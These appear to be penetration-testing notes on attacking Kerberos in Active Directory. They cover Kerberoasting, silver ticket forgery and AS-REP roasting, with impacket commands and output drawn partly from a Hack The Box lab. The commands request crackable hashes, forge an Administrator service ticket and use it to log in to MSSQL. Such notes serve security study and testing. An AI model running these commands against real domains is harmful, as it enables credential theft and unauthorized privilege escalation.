---
title: Attacking Kerberos
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/attacking-kerberos
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

## Attacking Kerberos

## Kerberoasting

Service accounts have SPNs **(Service Principal Names**). A service principal name (SPN) is the name by which a Kerberos client uniquely **identifies** an instance of a service for a given Kerberos target computer. If you install multiple instances of a service on computers throughout a forest, each instance must have its own **SPN**.

The main security issue surrounding the use of Service Principle Name (SPN) accounts is the fact that any valid user on the domain can abuse the Kerberos authentication protocol to begin the authentication process and receive a hash of any SPN account in use. This action can be performed by any user on the domain and does not require any elevated privileges. This attack is known as **kerberoasting** and we can perform it in this scenario, against the MySQL service account, using **impacket**:

```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local –k -request
```

If NTLM is enabled, we can also do kerberoasting with:

```bash
GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin --request
```

## Silver ticket attack

Similar in concept to a [Golden Ticket](https://www.netwrix.com/how_golden_ticket_attack_works.html), a Silver Ticket attack involves compromising credentials and abusing the design of the [Kerberos](https://stealthbits.com/blog/what-is-kerberos/) protocol. However, unlike a Golden Ticket — which grants an adversary unfettered access to the domain — a Silver Ticket only enables an attacker to forge ticket-granting service (TGS) tickets for specific services. TGS tickets are encrypted with the password hash for the service; therefore, if an adversary steals the hash for a service account, they can mint TGS tickets for that service.

### Creating a silver ticket

To gain the ability to mint TGS tickets, an adversary must first compromise the password hash of a service account. We have compromised the password hash for the sqlsvc account.

We need a few things to create a silver ticket:

* NTLM hash for service account
* Domain SID
* User id (500 is the default for Administrator)

### Getting NTLM hash of service account

To get the NTLM hash of a account, we can use a tool like <https://www.browserling.com/tools/ntlm-hash> to generate the NTLM hash of a password. In our case:

* B999A16500B87D17EC7F2E2A68778F05

### Getting Domain SID

We can use impacket-getPac to get the domain SID:

```bash
┌──(kali㉿kali)-[~/htb/scrambled]
└─$ impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson

Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

### Creating the silver ticket

```bash
┌──(kali㉿kali)-[~/htb/scrambled]
└─$ **impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash <nt-hash> -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local**
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

We successfully created a silver ticket for the Administrator user. To actually use the ticket, we need to export it in our host:

```bash
┌──(kali㉿kali)-[~/htb/scrambled]
└─$ export KRB5CCNAME=Administrator.ccache
```

### Getting RCE using impacket-mssqlclient

Now that we have a silver ticket for Administrator, we can use impacket-mssqlclient to authenticate with kerberos to the mysql service:

```bash
┌──(kali㉿kali)-[~/htb/scrambled]
└─$ impacket-mssqlclient dc1.scrm.local -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

## AS-REP Roasting

AS-REP roasting is an attack against Kerberos for user that don't require preauthentication During preauthentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request. From there, the TGT will be issued for the user to use for future authentication. If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.

```bash
impacket-GetNPUsers domain/user:passwrd -request -format [hashcat|john] -outputfile outfile
```
